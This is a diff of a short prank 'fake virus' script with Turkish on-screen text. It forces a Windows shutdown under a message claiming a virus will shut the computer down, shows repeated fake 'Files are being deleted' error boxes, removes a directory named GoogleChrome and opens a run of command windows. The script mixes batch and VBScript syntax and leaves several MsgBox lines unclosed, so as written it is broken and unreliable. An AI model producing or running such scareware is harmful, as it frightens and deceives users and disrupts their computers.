@@ -1,12 +1,21 @@
 shutdown -s -t 10 -c "Bilgisayarınız virüs tarafından 120 saniye içinde kapatılacak"
 
 X=MsgBox("Dosyalar Siliniyor",0+16,"Başlık")
+
 X=MsgBox("Dosyalar Siliniyor.",0+16,"Başlık"
+
 X=MsgBox("Dosyalar Siliniyor..",0+16,"Başlık"
+
 X=MsgBox("Dosyalar Siliniyor...",0+16,"Başlık"
+
 X=MsgBox("Dosyalar Siliniyor",0+16,"Başlık"
+
 rd GoogleChrome
+
 start cmd
+
+start cmd
+
 start cmd
 start cmd
 start cmd
